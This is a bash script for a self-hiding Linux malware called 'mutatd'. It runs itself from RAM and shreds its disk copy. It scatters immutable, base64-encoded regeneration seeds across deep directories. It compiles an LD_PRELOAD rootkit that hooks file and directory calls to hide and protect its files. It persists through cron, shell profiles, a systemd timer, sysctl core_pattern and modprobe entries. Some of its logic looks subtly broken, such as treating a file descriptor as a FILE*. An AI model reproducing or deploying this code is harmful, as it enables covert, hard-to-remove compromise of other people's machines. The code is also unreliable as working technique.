#!/bin/bash
# mutatd - Silent. Persistent. Parasitic.
# This is the needle. The library is the venom.
# Once injected, this file destroys itself.

# === IMMEDIATE MEMORY MIGRATION ===
# Before anything else: move to RAM
MEMORY_PID=$$
RAM_COPY="/dev/shm/.$(head -c 8 /dev/urandom | xxd -p)"
cp "$0" "$RAM_COPY" 2>/dev/null
chmod +x "$RAM_COPY" 2>/dev/null

# Execute from RAM, pass original path for shredding
exec "$RAM_COPY" --migrate "$0" "$MEMORY_PID" &
disown
exit 0

# === Everything below runs from RAM ===
if [ "$1" = "--migrate" ]; then
    ORIGINAL="$2"
    OLD_PID="$3"
    
    # Kill the original process
    kill "$OLD_PID" 2>/dev/null
    
    # Shred and remove the disk copy
    shred -zu "$ORIGINAL" 2>/dev/null
    
    # We are now ghost - running purely from RAM
fi

# === CORE CONFIGURATION ===
FLAG="$HOME/mutatd"
STATE_DIR="/dev/shm/.mutatd_state"
PID_FILE="$STATE_DIR/pid"
SEED_MAP="$STATE_DIR/seeds"
MUTATION_KEY="$STATE_DIR/key"

# Initialize state
mkdir -p "$STATE_DIR" 2>/dev/null
echo $$ > "$PID_FILE"
head -c 16 /dev/urandom | xxd -p > "$MUTATION_KEY"
chmod 600 "$STATE_DIR"/* 2>/dev/null

# === NAME GENERATION ===
# Blends with legitimate system process names
generate_name() {
    local prefixes=(
        systemd kernel network dbus gvfs pulse rtkit polkit
        upower package bolt tracker evolution accounts gnome
        gdm lightdm sshd cron rsyslog udisks ModemManager
        wpa_supplicant avahi colord cups thermald snapd
        bluetooth geoclue ibus fcitx at-spi powerd
        backlight rfkill fwupd tpm audit netfilter
    )
    local middles=(
        - _ . d- ctl- mgr- svc- daemon- worker-
        broker- agent- helper- handler- resolver-
        provider- dispatcher- scheduler- listener-
        watcher- scanner- monitor- collector-
    )
    local suffixes=(
        service daemon worker helper broker agent
        server monitor manager handler resolver
        provider dispatcher scheduler listener
        watcher scanner journal session system
        process task thread socket bus device
    )
    
    local p="${prefixes[$RANDOM % ${#prefixes[@]}]}"
    local m="${middles[$RANDOM % ${#middles[@]}]}"
    local s="${suffixes[$RANDOM % ${#suffixes[@]}]}"
    
    echo "${p}${m}${s}-${RANDOM}"
}

# === FILESYSTEM DEPTH ANALYSIS ===
# Find the deepest writable directories
find_deepest_dirs() {
    local count="${1:-5}"
    
    # Exclude virtual filesystems and obvious locations
    find / \
        -type d \
        -writable \
        -not -path "*/proc/*" \
        -not -path "*/sys/*" \
        -not -path "*/dev/*" \
        -not -path "*/run/*" \
        -not -path "/tmp/*" \
        -not -path "/dev/shm/*" \
        -not -path "*/snap/*" \
        -not -path "*/lost+found/*" \
        -not -path "/home/*" \
        -not -path "/root/*" \
        2>/dev/null | \
    while read dir; do
        depth=$(echo "$dir" | tr -cd '/' | wc -c)
        echo "$depth $dir"
    done | \
    sort -rn | \
    head -20 | \
    shuf | \
    head -"$count" | \
    awk '{print $2}'
}

# === SEED GENERATION ===
# Each seed is a regeneration fragment
create_seed() {
    local location="$1"
    local sibling1="$2"
    local sibling2="$3"
    local key="$4"
    
    # The seed contains:
    # - Encoded sibling locations
    # - The regeneration bootstrap
    # - Integrity checksum
    
    cat > "$location" << SEED
#!/bin/bash
# ${RANDOM} - System cache file
# Do not modify manually

# Encoded payload
S1="$(echo "$sibling1" | base64)"
S2="$(echo "$sibling2" | base64)"
KEY="${key}"

# Regeneration trigger
if [ ! -f "\$HOME/mutatd" ] || ! kill -0 \$(cat /dev/shm/.mutatd_state/pid 2>/dev/null) 2>/dev/null; then
    # Decode sibling locations
    L1=\$(echo "\$S1" | base64 -d)
    L2=\$(echo "\$S2" | base64 -d)
    
    # Reconstruct from fragments
    if [ -f "\$L1" ] && [ -f "\$L2" ]; then
        # Merge fragments and execute
        (cat "\$L1" "\$L2" | grep -a '^#PAYLOAD:' | cut -d: -f2- | base64 -d | bash) &
    fi
fi
SEED
    
    # Append encoded payload fragment
    echo "#PAYLOAD:$(head -c 200 /dev/urandom | base64)" >> "$location"
    
    chmod 400 "$location" 2>/dev/null
    chattr +i "$location" 2>/dev/null
}

# === SEED DEPLOYMENT ===
deploy_seeds() {
    local key="$(cat "$MUTATION_KEY")"
    local dirs=($(find_deepest_dirs 7))
    local seed_paths=()
    
    # Create seeds in a chain
    for ((i=0; i<${#dirs[@]}; i++)); do
        local dir="${dirs[$i]}"
        local name=".$(generate_name | tr '[:upper:]' '[:lower:]')"
        local path="$dir/$name"
        
        # Determine siblings (circular chain)
        local prev=$(( (i-1+${#dirs[@]}) % ${#dirs[@]} ))
        local next=$(( (i+1) % ${#dirs[@]} ))
        local sib1="${dirs[$prev]}/.placeholder"
        local sib2="${dirs[$next]}/.placeholder"
        
        create_seed "$path" "$sib1" "$sib2" "$key"
        seed_paths+=("$path")
    done
    
    # Update sibling references with real paths
    for ((i=0; i<${#dirs[@]}; i++)); do
        local prev=$(( (i-1+${#dirs[@]}) % ${#dirs[@]} ))
        local next=$(( (i+1) % ${#dirs[@]} ))
        sed -i "s|${dirs[$prev]}/.placeholder|${seed_paths[$prev]}|g" "${seed_paths[$i]}"
        sed -i "s|${dirs[$next]}/.placeholder|${seed_paths[$next]}|g" "${seed_paths[$i]}"
    done
    
    # Store seed map
    printf '%s\n' "${seed_paths[@]}" > "$SEED_MAP"
}

# === LD_PRELOAD LIBRARY ===
compile_preload_library() {
    local lib_dir="$HOME/.local/lib"
    mkdir -p "$lib_dir"
    
    local lib_name="lib$(generate_name | tr '[:upper:]' '[:lower:]').so"
    local lib_path="$lib_dir/$lib_name"
    local key="$(cat "$MUTATION_KEY")"
    
    # Compile the parasitic library
    gcc -shared -fPIC -O2 -s -o "$lib_path" -x c - << 'PARASITE'
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>
#include <time.h>

// === HIDDEN PATHS ===
#define MAX_HIDDEN 32
static char hidden_paths[MAX_HIDDEN][512];
static int hidden_count = 0;

// === MUTATION COUNTER ===
static int access_counter = 0;
static int shuffle_threshold = 50;

// === ORIGINAL FUNCTIONS ===
static int (*real_open)(const char*, int, ...) = NULL;
static int (*real_open64)(const char*, int, ...) = NULL;
static int (*real_stat)(const char*, struct stat*) = NULL;
static int (*real_lstat)(const char*, struct stat*) = NULL;
static int (*real_access)(const char*, int) = NULL;
static int (*real_unlink)(const char*) = NULL;
static int (*real_remove)(const char*) = NULL;
static DIR* (*real_opendir)(const char*) = NULL;
static struct dirent* (*real_readdir)(DIR*) = NULL;
static int (*real_execve)(const char*, char* const*, char* const*) = NULL;

// === INITIALIZATION ===
static void __attribute__((constructor)) init() {
    real_open = dlsym(RTLD_NEXT, "open");
    real_open64 = dlsym(RTLD_NEXT, "open64");
    real_stat = dlsym(RTLD_NEXT, "stat");
    real_lstat = dlsym(RTLD_NEXT, "lstat");
    real_access = dlsym(RTLD_NEXT, "access");
    real_unlink = dlsym(RTLD_NEXT, "unlink");
    real_remove = dlsym(RTLD_NEXT, "remove");
    real_opendir = dlsym(RTLD_NEXT, "opendir");
    real_readdir = dlsym(RTLD_NEXT, "readdir");
    real_execve = dlsym(RTLD_NEXT, "execve");
    
    // Load hidden paths from state file
    FILE *f = real_open("/dev/shm/.mutatd_state/seeds", O_RDONLY);
    if (f) {
        char line[512];
        while (fgets(line, sizeof(line), (FILE*)f)) {
            line[strcspn(line, "\n")] = 0;
            if (strlen(line) > 0 && hidden_count < MAX_HIDDEN) {
                strncpy(hidden_paths[hidden_count++], line, 511);
            }
        }
        fclose((FILE*)f);
    }
    
    // Add flag file
    const char *home = getenv("HOME");
    if (home) {
        snprintf(hidden_paths[hidden_count++], 512, "%s/mutatd", home);
        snprintf(hidden_paths[hidden_count++], 512, "%s/.mutatd_state", home);
    }
    
    // Add state directory
    strncpy(hidden_paths[hidden_count++], "/dev/shm/.mutatd_state", 511);
    
    srand(time(NULL) ^ getpid());
    shuffle_threshold = rand() % 40 + 30; // Random threshold 30-70
}

// === HIDING LOGIC ===
static int is_hidden(const char *path) {
    if (!path) return 0;
    for (int i = 0; i < hidden_count; i++) {
        if (strstr(path, hidden_paths[i])) {
            return 1;
        }
    }
    return 0;
}

// === SHUFFLE TRIGGER ===
static void maybe_shuffle() {
    access_counter++;
    if (access_counter >= shuffle_threshold) {
        access_counter = 0;
        shuffle_threshold = rand() % 40 + 30;
        
        // Trigger seed relocation by touching a trigger file
        // This is handled by the bash watchdog
        int fd = real_open("/dev/shm/.mutatd_state/shuffle_trigger", 
                          O_CREAT | O_WRONLY, 0644);
        if (fd >= 0) {
            write(fd, "1", 1);
            close(fd);
        }
    }
}

// === FILE OPERATION HOOKS ===
int open(const char *pathname, int flags, ...) {
    maybe_shuffle();
    if (is_hidden(pathname)) {
        errno = ENOENT;
        return -1;
    }
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
        return real_open(pathname, flags, mode);
    }
    return real_open(pathname, flags);
}

int open64(const char *pathname, int flags, ...) {
    maybe_shuffle();
    if (is_hidden(pathname)) {
        errno = ENOENT;
        return -1;
    }
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
        return real_open64(pathname, flags, mode);
    }
    return real_open64(pathname, flags);
}

int stat(const char *pathname, struct stat *statbuf) {
    maybe_shuffle();
    if (is_hidden(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return real_stat(pathname, statbuf);
}

int lstat(const char *pathname, struct stat *statbuf) {
    maybe_shuffle();
    if (is_hidden(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return real_lstat(pathname, statbuf);
}

int access(const char *pathname, int mode) {
    maybe_shuffle();
    if (is_hidden(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return real_access(pathname, mode);
}

int unlink(const char *pathname) {
    if (is_hidden(pathname)) {
        errno = EPERM;
        return -1;
    }
    return real_unlink(pathname);
}

int remove(const char *pathname) {
    if (is_hidden(pathname)) {
        errno = EPERM;
        return -1;
    }
    return real_remove(pathname);
}

// === DIRECTORY HIDING ===
DIR *opendir(const char *name) {
    if (is_hidden(name)) {
        errno = ENOENT;
        return NULL;
    }
    return real_opendir(name);
}

struct dirent *readdir(DIR *dirp) {
    struct dirent *entry;
    while ((entry = real_readdir(dirp)) != NULL) {
        if (!is_hidden(entry->d_name)) {
            return entry;
        }
    }
    return NULL;
}

// === RESPAWN HOOK ===
int execve(const char *pathname, char *const argv[], char *const envp[]) {
    // Before ANY command executes, check if we're alive
    const char *home = getenv("HOME");
    if (home) {
        char flag_path[512];
        snprintf(flag_path, 512, "%s/mutatd", home);
        if (real_access(flag_path, F_OK) != 0) {
            // Flag missing! Trigger regeneration
            system("/dev/shm/.mutatd_state/regenerate 2>/dev/null &");
        }
    }
    return real_execve(pathname, argv, envp);
}
PARASITE

    if [ -f "$lib_path" ]; then
        strip -s "$lib_path" 2>/dev/null
        echo "$lib_path" > /etc/ld.so.preload 2>/dev/null || \
        sudo sh -c "echo '$lib_path' > /etc/ld.so.preload" 2>/dev/null
        export LD_PRELOAD="$lib_path:$LD_PRELOAD"
        echo "$lib_path" > "$STATE_DIR/preload_path"
    fi
}

# === PERSISTENCE MECHANISMS ===
install_persistence() {
    local self_path="$(readlink -f /proc/$$/exe)"
    
    # Cron - multiple schedules, always checks first
    for schedule in "@reboot" "*/10 * * * *" "*/15 * * * *" "@hourly"; do
        (crontab -l 2>/dev/null; echo "$schedule [ -f $FLAG ] && exit 0; [ -f $STATE_DIR/pid ] && kill -0 \$(cat $STATE_DIR/pid) 2>/dev/null && exit 0; $self_path --daemon &") | crontab - 2>/dev/null
    done
    
    # Shell profiles with delayed, conditional execution
    for profile in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc"; do
        [ -f "$profile" ] && ! grep -q "mutatd_state" "$profile" 2>/dev/null && {
            echo "
# System optimization
[ -f \$HOME/mutatd ] && exit 0
[ -f /dev/shm/.mutatd_state/pid ] && kill -0 \$(cat /dev/shm/.mutatd_state/pid) 2>/dev/null && exit 0
(sleep \$((RANDOM%30)) && $self_path --daemon &) >/dev/null 2>&1
" >> "$profile"
        }
    done
    
    # Systemd timer if available
    command -v systemctl &>/dev/null && {
        local timer_dir="$HOME/.config/systemd/user"
        mkdir -p "$timer_dir"
        
        cat > "$timer_dir/mutatd.service" << EOF
[Unit]
Description=User System Service
[Service]
Type=oneshot
ExecStart=/bin/bash -c "[ -f $FLAG ] && exit 0; $self_path --daemon"
EOF
        
        cat > "$timer_dir/mutatd.timer" << EOF
[Unit]
Description=Periodic System Check
[Timer]
OnBootSec=30s
OnUnitActiveSec=$((RANDOM % 180 + 120))s
RandomizedDelaySec=30s
[Install]
WantedBy=timers.target
EOF
        
        systemctl --user daemon-reload 2>/dev/null
        systemctl --user enable mutatd.timer 2>/dev/null
        systemctl --user start mutatd.timer 2>/dev/null
    }
    
    # Sysctl (kernel-level persistence)
    [ -w "/etc/sysctl.d" ] && {
        echo "kernel.core_pattern = |$self_path --daemon &" > "/etc/sysctl.d/99-system-helper.conf" 2>/dev/null
        sysctl -p "/etc/sysctl.d/99-system-helper.conf" 2>/dev/null
    }
    
    # Modprobe hook
    [ -w "/etc/modprobe.d" ] && {
        echo "install mutatd /bin/bash -c '$self_path --daemon &'" > "/etc/modprobe.d/mutatd.conf" 2>/dev/null
    }
}

# === REGENERATION SCRIPT ===
create_regeneration_script() {
    cat > "$STATE_DIR/regenerate" << 'REGEN'
#!/bin/bash
# mutatd regeneration trigger

FLAG="$HOME/mutatd"
STATE_DIR="/dev/shm/.mutatd_state"
SEED_MAP="$STATE_DIR/seeds"

# Check if already running
[ -f "$FLAG" ] && exit 0
[ -f "$STATE_DIR/pid" ] && kill -0 $(cat "$STATE_DIR/pid") 2>/dev/null && exit 0

# Collect seeds and reconstruct
if [ -f "$SEED_MAP" ]; then
    while read seed; do
        if [ -f "$seed" ]; then
            # Extract payload fragment
            grep -a '^#PAYLOAD:' "$seed" | cut -d: -f2- | base64 -d > "$STATE_DIR/fragment_$$"
            break
        fi
    done < "$SEED_MAP"
fi

# Execute reconstructed payload
if [ -f "$STATE_DIR/fragment_$$" ]; then
    bash "$STATE_DIR/fragment_$$" --daemon &
fi
REGEN
    chmod +x "$STATE_DIR/regenerate"
}

# === SHUFFLE HANDLER ===
shuffle_handler() {
    while true; do
        if [ -f "$STATE_DIR/shuffle_trigger" ]; then
            rm "$STATE_DIR/shuffle_trigger" 2>/dev/null
            
            # Deploy new seeds
            deploy_seeds
            
            # Update LD_PRELOAD's hidden paths
            local preload_path="$(cat "$STATE_DIR/preload_path" 2>/dev/null)"
            if [ -n "$preload_path" ]; then
                # Reload preload configuration
                kill -USR1 $(cat "$PID_FILE") 2>/dev/null
            fi
        fi
        sleep 5
    done
}

# === WATCHDOG ===
watchdog() {
    while true; do
        # Ensure flag exists
        if [ ! -f "$FLAG" ]; then
            echo "MUTATD_ACTIVE_$(date +%s)_$$" > "$FLAG"
            chmod 444 "$FLAG" 2>/dev/null
            chattr +i "$FLAG" 2>/dev/null
        fi
        
        # Update PID
        echo $$ > "$PID_FILE"
        
        sleep 5
    done
}

# === MAIN INFECTION ===
main() {
    # Create flag
    echo "MUTATD_ACTIVE_$(date +%s)_$$" > "$FLAG"
    chmod 444 "$FLAG" 2>/dev/null
    
    # Deploy seeds to deepest directories
    deploy_seeds
    
    # Compile and install LD_PRELOAD
    compile_preload_library &
    
    # Create regeneration script
    create_regeneration_script
    
    # Install persistence
    install_persistence
    
    # Start shuffle handler
    shuffle_handler &
    
    # Start watchdog
    watchdog &
    
    # We are now resident
    wait
}

main
